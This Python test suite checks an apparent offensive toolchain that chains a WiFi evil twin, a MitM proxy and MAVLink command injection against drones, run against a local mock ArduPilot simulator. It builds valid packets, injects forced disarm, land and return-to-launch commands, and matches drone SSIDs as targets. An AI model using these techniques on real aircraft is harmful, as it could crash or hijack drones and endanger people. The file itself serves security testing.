#!/usr/bin/env python3
"""
End-to-end integration tests for Chain 2: WiFi → MAVLink injection.

Tests the full attack chain (evil twin AP → MitM proxy → MAVLink command
injection) against a mock ArduPilot SITL endpoint. No hardware or real
SITL binary required — the test spins up a lightweight MAVLink-speaking
UDP server that emits heartbeats and ACKs injected commands, then validates
each chain stage against it.

Test architecture:

    MockSITL (UDP :0)          MitM Proxy (UDP :0)
        ↕ heartbeats               ↕ relay
    Chain recon ──────────────────→ │
    Chain inject ─────────────────→ │ ──→ MockSITL

Runs in CI without pymavlink, hostapd, or aircrack-ng.
"""

import importlib.util
import json
import socket
import struct
import sys
import threading
import time
import unittest
from pathlib import Path

TOOLS_DIR = Path(__file__).resolve().parents[1]
CHAINS_DIR = TOOLS_DIR / "exploit_chains"

# ---------------------------------------------------------------------------
# Module loaders (hyphenated filenames can't be imported normally)
# ---------------------------------------------------------------------------

def _load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


def _load_chain():
    return _load_module("wifi_mavlink_chain",
                        CHAINS_DIR / "wifi_mavlink_chain.py")


def _load_proxy():
    return _load_module("mavlink_mitm_proxy",
                        TOOLS_DIR / "mavlink-mitm-proxy.py")


def _load_evil_twin():
    return _load_module("evil_twin_ap",
                        TOOLS_DIR / "evil-twin-ap.py")


# ---------------------------------------------------------------------------
# MAVLink helpers (minimal, no pymavlink dependency)
# ---------------------------------------------------------------------------

MAVLINK_V2_MAGIC = 0xFD
MSG_HEARTBEAT = 0
MSG_COMMAND_LONG = 76
MSG_COMMAND_ACK = 77

MAV_CMD_ARM_DISARM = 400
MAV_CMD_NAV_LAND = 21
MAV_CMD_NAV_RTL = 20

CRC_EXTRAS = {
    MSG_HEARTBEAT: 50,
    MSG_COMMAND_LONG: 152,
    MSG_COMMAND_ACK: 143,
}


def mavlink_crc(data: bytes, crc_extra: int) -> int:
    crc = 0xFFFF
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp ^= (tmp << 4) & 0xFF
        crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
        crc &= 0xFFFF
    tmp = crc_extra ^ (crc & 0xFF)
    tmp ^= (tmp << 4) & 0xFF
    crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
    return crc & 0xFFFF


def build_heartbeat(sys_id: int = 1, armed: bool = True,
                    seq: int = 0) -> bytes:
    """Build a MAVLink v2 HEARTBEAT packet (ArduPilot quadrotor)."""
    base_mode = 0x81 if armed else 0x01
    payload = struct.pack("<IBBBBB",
                          0,     # custom_mode = STABILIZE
                          2,     # MAV_TYPE_QUADROTOR
                          3,     # MAV_AUTOPILOT_ARDUPILOTMEGA
                          base_mode,
                          4,     # MAV_STATE_ACTIVE
                          3)     # mavlink_version
    header = bytes([
        MAVLINK_V2_MAGIC, len(payload), 0, 0, seq & 0xFF,
        sys_id, 1,
        MSG_HEARTBEAT & 0xFF,
        (MSG_HEARTBEAT >> 8) & 0xFF,
        (MSG_HEARTBEAT >> 16) & 0xFF,
    ])
    crc_data = header[1:] + payload
    crc = mavlink_crc(crc_data, CRC_EXTRAS[MSG_HEARTBEAT])
    return header + payload + struct.pack("<H", crc)


def build_command_ack(command: int, result: int = 0,
                      sys_id: int = 1, seq: int = 0) -> bytes:
    """Build a MAVLink v2 COMMAND_ACK packet."""
    payload = struct.pack("<HBBiBB",
                          command, result, 0, 0, 255, 190)
    header = bytes([
        MAVLINK_V2_MAGIC, len(payload), 0, 0, seq & 0xFF,
        sys_id, 1,
        MSG_COMMAND_ACK & 0xFF,
        (MSG_COMMAND_ACK >> 8) & 0xFF,
        (MSG_COMMAND_ACK >> 16) & 0xFF,
    ])
    crc_data = header[1:] + payload
    crc = mavlink_crc(crc_data, CRC_EXTRAS[MSG_COMMAND_ACK])
    return header + payload + struct.pack("<H", crc)


def parse_v2_header(data: bytes) -> dict | None:
    """Minimal v2 header parse."""
    if len(data) < 12 or data[0] != MAVLINK_V2_MAGIC:
        return None
    payload_len = data[1]
    total = 10 + payload_len + 2
    if len(data) < total:
        return None
    msg_id = data[7] | (data[8] << 8) | (data[9] << 16)
    return {
        "msg_id": msg_id,
        "sys_id": data[5],
        "comp_id": data[6],
        "seq": data[4],
        "payload": data[10:10 + payload_len],
        "total_len": total,
    }


def _free_udp_port() -> int:
    """Return a UDP port that is currently free on localhost."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


# ---------------------------------------------------------------------------
# Mock SITL — lightweight MAVLink endpoint
# ---------------------------------------------------------------------------

class MockSITL:
    """
    Minimal ArduPilot SITL simulator: sends heartbeats at ~2 Hz, ACKs any
    COMMAND_LONG it receives, and records every received command for assertions.
    """

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.port = self.sock.getsockname()[1]
        self.sock.settimeout(0.25)
        self._running = False
        self._thread = None
        self._seq = 0
        self.received_commands: list[dict] = []
        self.heartbeats_sent = 0
        self._peers: set[tuple] = set()
        self._lock = threading.Lock()

    @property
    def target(self) -> str:
        return f"udp:127.0.0.1:{self.port}"

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
        self.sock.close()

    def _loop(self):
        next_heartbeat = time.monotonic()
        while self._running:
            now = time.monotonic()
            if now >= next_heartbeat:
                hb = build_heartbeat(sys_id=1, armed=True, seq=self._seq)
                self._seq = (self._seq + 1) & 0xFF
                with self._lock:
                    for peer in self._peers:
                        try:
                            self.sock.sendto(hb, peer)
                        except OSError:
                            pass
                self.heartbeats_sent += 1
                next_heartbeat = now + 0.5

            try:
                data, addr = self.sock.recvfrom(4096)
                with self._lock:
                    self._peers.add(addr)
                self._handle_packet(data, addr)
            except socket.timeout:
                continue
            except OSError:
                if not self._running:
                    break

    def _handle_packet(self, data: bytes, addr: tuple):
        pkt = parse_v2_header(data)
        if not pkt:
            return
        if pkt["msg_id"] == MSG_COMMAND_LONG and len(pkt["payload"]) >= 33:
            params_raw = struct.unpack("<fffffffHBBB", pkt["payload"][:33])
            cmd_info = {
                "command": params_raw[7],
                "params": list(params_raw[:7]),
                "target_sys": params_raw[8],
                "target_comp": params_raw[9],
                "from": addr,
                "timestamp": time.monotonic(),
            }
            self.received_commands.append(cmd_info)
            ack = build_command_ack(params_raw[7], result=0,
                                    sys_id=1, seq=self._seq)
            self._seq = (self._seq + 1) & 0xFF
            try:
                self.sock.sendto(ack, addr)
            except OSError:
                pass

    def register_peer(self, addr: tuple):
        """Pre-register a peer so heartbeats flow immediately."""
        with self._lock:
            self._peers.add(addr)


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestMockSITL(unittest.TestCase):
    """Sanity-check the mock SITL itself before using it in chain tests."""

    def test_heartbeat_building(self):
        hb = build_heartbeat(sys_id=1, armed=True)
        self.assertEqual(hb[0], MAVLINK_V2_MAGIC)
        pkt = parse_v2_header(hb)
        self.assertIsNotNone(pkt)
        self.assertEqual(pkt["msg_id"], MSG_HEARTBEAT)
        self.assertEqual(pkt["sys_id"], 1)

    def test_command_ack_building(self):
        ack = build_command_ack(MAV_CMD_ARM_DISARM, result=0)
        pkt = parse_v2_header(ack)
        self.assertIsNotNone(pkt)
        self.assertEqual(pkt["msg_id"], MSG_COMMAND_ACK)

    def test_mock_sitl_receives_commands(self):
        sitl = MockSITL()
        sitl.start()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            sock.sendto(b"\xfd\x00", ("127.0.0.1", sitl.port))
            time.sleep(0.3)

            chain = _load_chain()
            cmd = chain.ATTACK_COMMANDS["disarm"]
            pkt = chain.build_command_long(1, 1, cmd["cmd_id"],
                                           list(cmd["params"]))
            sock.sendto(pkt, ("127.0.0.1", sitl.port))
            time.sleep(0.5)

            self.assertGreater(len(sitl.received_commands), 0)
            self.assertEqual(sitl.received_commands[0]["command"],
                             MAV_CMD_ARM_DISARM)
            sock.close()
        finally:
            sitl.stop()


class TestChain2SimulateMode(unittest.TestCase):
    """Test Chain 2 orchestrator in --simulate mode (no network)."""

    @classmethod
    def setUpClass(cls):
        cls.chain = _load_chain()

    def test_simulate_produces_all_stages(self):
        """--simulate should run all four stages and return structured results."""
        import argparse
        args = argparse.Namespace(
            dry_run=False, arm=False, simulate=True,
            target=None, target_sysid=1,
            commands=["disarm", "land"],
            skip_recon=False, evil_twin=False,
            ssid=None, channel=None, interface=None,
            json_output=None, log_dir=None, timeout=5.0,
        )
        from common import ChainLogger, AbortHandler
        logger = ChainLogger("test-chain2")
        abort = AbortHandler(logger)

        result = self.chain.run_full_chain(args, logger, abort)

        self.assertEqual(result["chain"], "wifi_mavlink")
        self.assertEqual(result["chain_id"], 2)
        self.assertEqual(result["mode"], "simulate")
        self.assertIn("recon", result["stages"])
        self.assertIn("evil_twin", result["stages"])
        self.assertIn("mitm", result["stages"])
        self.assertIn("inject", result["stages"])

        recon = result["stages"]["recon"]
        self.assertEqual(recon["system_ids"], [1])
        self.assertFalse(recon["signed"])
        self.assertEqual(recon["heartbeat"]["type"], "QUADROTOR")
        self.assertTrue(recon["heartbeat"]["armed"])

        inject = result["stages"]["inject"]
        self.assertEqual(len(inject["injections"]), 2)
        for inj in inject["injections"]:
            self.assertEqual(inj["status"], "simulated")
            self.assertIn("packet_hex", inj)

    def test_simulate_all_attack_commands(self):
        """Every defined attack command should produce a valid MAVLink packet."""
        for cmd_name, cmd in self.chain.ATTACK_COMMANDS.items():
            pkt = self.chain.build_command_long(
                1, 1, cmd["cmd_id"], list(cmd["params"]))
            self.assertEqual(pkt[0], MAVLINK_V2_MAGIC,
                             f"{cmd_name}: bad magic")
            parsed = parse_v2_header(pkt)
            self.assertIsNotNone(parsed, f"{cmd_name}: unparseable")
            self.assertEqual(parsed["msg_id"], MSG_COMMAND_LONG,
                             f"{cmd_name}: wrong msg_id")

    def test_build_set_mode_produces_valid_packet(self):
        pkt = self.chain.build_set_mode(1, 9)
        self.assertEqual(pkt[0], MAVLINK_V2_MAGIC)
        parsed = parse_v2_header(pkt)
        self.assertIsNotNone(parsed)
        self.assertEqual(parsed["msg_id"], 11)

    def test_build_rc_override_produces_valid_packet(self):
        pkt = self.chain.build_rc_override(1, ch1=1000, ch3=1200)
        self.assertEqual(pkt[0], MAVLINK_V2_MAGIC)
        parsed = parse_v2_header(pkt)
        self.assertIsNotNone(parsed)
        self.assertEqual(parsed["msg_id"], 70)


class TestChain2LiveRecon(unittest.TestCase):
    """Test Chain 2 recon stage against a live mock SITL."""

    def test_recon_discovers_mock_sitl(self):
        """Recon should find the mock SITL, extract sys_id, and read heartbeats."""
        sitl = MockSITL()
        sitl.start()
        try:
            chain = _load_chain()
            from common import ChainLogger, AbortHandler
            logger = ChainLogger("test-recon")
            abort = AbortHandler(logger)

            # stage_recon binds 0.0.0.0:port with SO_REUSEADDR.  On Linux this
            # can coexist with MockSITL’s 127.0.0.1:port, so the bind succeeds
            # but packets route to the more-specific socket (MockSITL) and recon
            # receives nothing.  Fix: use a dedicated free port that has no
            # competing bind, and register it as a MockSITL peer.
            recon_port = _free_udp_port()
            sitl.register_peer(("127.0.0.1", recon_port))
            time.sleep(0.6)

            result = chain.stage_recon(
                f"udp:127.0.0.1:{recon_port}",
                logger, abort, timeout=3.0)

            self.assertGreater(result["packets"], 0,
                               "Recon should have captured heartbeat packets")
            self.assertIn(1, result["system_ids"],
                          "Recon should discover sys_id=1")
            self.assertFalse(result["signed"],
                             "Mock SITL sends unsigned packets")
            self.assertIsNotNone(result["heartbeat"],
                                 "Recon should parse at least one heartbeat")
            if result["heartbeat"]:
                self.assertEqual(result["heartbeat"]["type"], "QUADROTOR")
        finally:
            sitl.stop()


class TestChain2LiveInjection(unittest.TestCase):
    """Test Chain 2 injection stage against a live mock SITL."""

    def test_inject_disarm_reaches_sitl(self):
        """Injected disarm command should be received and parsed by SITL."""
        sitl = MockSITL()
        sitl.start()
        try:
            chain = _load_chain()
            from common import ChainLogger, AbortHandler
            logger = ChainLogger("test-inject")
            abort = AbortHandler(logger)

            result = chain.stage_inject(
                sitl.target, sys_id=1, commands=["disarm"],
                logger=logger, abort=abort, dry_run=False)

            time.sleep(0.5)
            disarm_cmds = [c for c in sitl.received_commands
                           if c["command"] == MAV_CMD_ARM_DISARM]
            self.assertGreater(len(disarm_cmds), 0,
                               "SITL should have received disarm commands")
            self.assertEqual(disarm_cmds[0]["params"][0], 0.0,
                             "Disarm param1 should be 0 (disarm)")
        finally:
            sitl.stop()

    def test_inject_land_reaches_sitl(self):
        """Injected land command should reach the mock SITL."""
        sitl = MockSITL()
        sitl.start()
        try:
            chain = _load_chain()
            from common import ChainLogger, AbortHandler
            logger = ChainLogger("test-inject-land")
            abort = AbortHandler(logger)

            chain.stage_inject(
                sitl.target, sys_id=1, commands=["land"],
                logger=logger, abort=abort, dry_run=False)

            time.sleep(0.5)
            land_cmds = [c for c in sitl.received_commands
                         if c["command"] == MAV_CMD_NAV_LAND]
            self.assertGreater(len(land_cmds), 0)
        finally:
            sitl.stop()

    def test_inject_multiple_commands(self):
        """Multiple commands should all reach the SITL."""
        sitl = MockSITL()
        sitl.start()
        try:
            chain = _load_chain()
            from common import ChainLogger, AbortHandler
            logger = ChainLogger("test-inject-multi")
            abort = AbortHandler(logger)

            chain.stage_inject(
                sitl.target, sys_id=1,
                commands=["disarm", "land", "rtl"],
                logger=logger, abort=abort, dry_run=False)

            time.sleep(0.5)
            cmd_ids = {c["command"] for c in sitl.received_commands}
            self.assertIn(MAV_CMD_ARM_DISARM, cmd_ids)
            self.assertIn(MAV_CMD_NAV_LAND, cmd_ids)
            self.assertIn(MAV_CMD_NAV_RTL, cmd_ids)
        finally:
            sitl.stop()

    def test_dry_run_does_not_send(self):
        """Dry run should not transmit any packets to SITL."""
        sitl = MockSITL()
        sitl.start()
        try:
            chain = _load_chain()
            from common import ChainLogger, AbortHandler
            logger = ChainLogger("test-dryrun")
            abort = AbortHandler(logger)

            result = chain.stage_inject(
                sitl.target, sys_id=1, commands=["disarm", "land"],
                logger=logger, abort=abort, dry_run=True)

            time.sleep(0.3)
            self.assertEqual(len(sitl.received_commands), 0,
                             "Dry run should not send any packets")
            for inj in result["injections"]:
                self.assertEqual(inj["status"], "dry_run")
                self.assertIn("packet_hex", inj)
        finally:
            sitl.stop()


class TestChain2FullE2E(unittest.TestCase):
    """
    Full end-to-end: mock SITL → orchestrator → inject → verify.

    Recon is skipped here because run_full_chain shares a single target for
    both recon and inject, and the SO_REUSEADDR port-binding semantics on
    Linux make live recon against a local MockSITL unreliable (see
    TestChain2LiveRecon for standalone recon testing).
    """

    def test_full_chain_against_mock_sitl(self):
        """
        Run the chain orchestrator (skip-recon + inject) against mock SITL
        and verify the drone received the injected commands.
        """
        sitl = MockSITL()
        sitl.start()
        try:
            chain = _load_chain()
            from common import ChainLogger, AbortHandler
            import argparse

            logger = ChainLogger("test-e2e")
            abort = AbortHandler(logger)

            args = argparse.Namespace(
                dry_run=False, arm=True, simulate=False,
                target=sitl.target, target_sysid=1,
                commands=["disarm", "land"],
                skip_recon=True, evil_twin=False,
                ssid=None, channel=None, interface=None,
                json_output=None, log_dir=None, timeout=3.0,
            )

            result = chain.run_full_chain(args, logger, abort)

            self.assertEqual(result["chain"], "wifi_mavlink")
            self.assertEqual(result["mode"], "armed")
            self.assertIn("recon", result["stages"])
            self.assertIn("inject", result["stages"])

            # Verify injected commands reached SITL
            time.sleep(0.5)
            cmd_ids = {c["command"] for c in sitl.received_commands}
            self.assertIn(MAV_CMD_ARM_DISARM, cmd_ids,
                          "Disarm should reach SITL through full chain")
            self.assertIn(MAV_CMD_NAV_LAND, cmd_ids,
                          "Land should reach SITL through full chain")

            inject = result["stages"]["inject"]
            self.assertEqual(len(inject["injections"]), 2)
            for inj in inject["injections"]:
                self.assertEqual(inj["status"], "sent")

        finally:
            sitl.stop()

    def test_full_chain_with_skip_recon(self):
        """Chain with --skip-recon should still inject successfully."""
        sitl = MockSITL()
        sitl.start()
        try:
            chain = _load_chain()
            from common import ChainLogger, AbortHandler
            import argparse

            logger = ChainLogger("test-e2e-skip-recon")
            abort = AbortHandler(logger)

            args = argparse.Namespace(
                dry_run=False, arm=True, simulate=False,
                target=sitl.target, target_sysid=1,
                commands=["rtl"],
                skip_recon=True, evil_twin=False,
                ssid=None, channel=None, interface=None,
                json_output=None, log_dir=None, timeout=3.0,
            )

            result = chain.run_full_chain(args, logger, abort)

            time.sleep(0.5)
            rtl_cmds = [c for c in sitl.received_commands
                        if c["command"] == MAV_CMD_NAV_RTL]
            self.assertGreater(len(rtl_cmds), 0,
                               "RTL should reach SITL even with skipped recon")
        finally:
            sitl.stop()


class TestMitMProxySimulate(unittest.TestCase):
    """Test the MitM proxy's simulate mode."""

    def test_proxy_simulate_returns_stats(self):
        proxy_mod = _load_proxy()
        from common import ChainLogger
        logger = ChainLogger("test-proxy-sim")
        result = proxy_mod.simulate_proxy(logger)
        self.assertIsNotNone(result)
        self.assertEqual(result["status"], "simulated")
        self.assertIn("packets_proxied", result)
        self.assertIn("commands_injected", result)


class TestEvilTwinSimulate(unittest.TestCase):
    """Test the evil twin AP tool's simulate and scan logic."""

    def test_drone_ssid_pattern_matching(self):
        et = _load_evil_twin()
        for ssid, expected_type in [
            ("TELLO-AABBCC", "tello"),
            ("Bebop2-12345", "parrot"),
            ("ArduPilot-WiFi", "ardupilot"),
        ]:
            result = None
            for pattern, dtype, desc in et.DRONE_SSID_PATTERNS:
                import re
                if re.match(pattern, ssid, re.IGNORECASE):
                    result = dtype
                    break
            self.assertEqual(result, expected_type,
                             f"SSID '{ssid}' should match type '{expected_type}'")

    def test_non_drone_ssid_no_match(self):
        et = _load_evil_twin()
        import re
        for ssid in ["MyHomeWifi", "Starbucks_Guest", "5G-Network"]:
            matched = False
            for pattern, _, _ in et.DRONE_SSID_PATTERNS:
                if re.match(pattern, ssid, re.IGNORECASE):
                    matched = True
                    break
            self.assertFalse(matched,
                             f"Non-drone SSID '{ssid}' should not match")


class TestMavlinkPacketIntegrity(unittest.TestCase):
    """Verify CRC correctness and packet structure for all packet builders."""

    def test_heartbeat_crc_valid(self):
        hb = build_heartbeat(sys_id=1)
        payload_len = hb[1]
        crc_data = hb[1:10] + hb[10:10 + payload_len]
        expected_crc = mavlink_crc(crc_data, CRC_EXTRAS[MSG_HEARTBEAT])
        actual_crc = struct.unpack_from("<H", hb, 10 + payload_len)[0]
        self.assertEqual(actual_crc, expected_crc)

    def test_command_long_crc_matches_chain_implementation(self):
        """CRC from our test helper should match the chain's implementation."""
        chain = _load_chain()
        for cmd_name in ["disarm", "land", "rtl"]:
            cmd = chain.ATTACK_COMMANDS[cmd_name]
            pkt = chain.build_command_long(1, 1, cmd["cmd_id"],
                                           list(cmd["params"]))
            payload_len = pkt[1]
            crc_data = pkt[1:10] + pkt[10:10 + payload_len]
            expected = mavlink_crc(crc_data, CRC_EXTRAS[MSG_COMMAND_LONG])
            actual = struct.unpack_from("<H", pkt, 10 + payload_len)[0]
            self.assertEqual(actual, expected,
                             f"CRC mismatch for {cmd_name}")

    def test_packet_sys_id_targeting(self):
        """Commands should target the specified system ID."""
        chain = _load_chain()
        for target_sys in [1, 2, 255]:
            pkt = chain.build_command_long(
                target_sys, 1, MAV_CMD_ARM_DISARM, [0, 21196])
            parsed = parse_v2_header(pkt)
            params = struct.unpack("<fffffffHBBB", parsed["payload"][:33])
            self.assertEqual(params[8], target_sys,
                             f"Target sys_id should be {target_sys}")


if __name__ == "__main__":
    unittest.main()
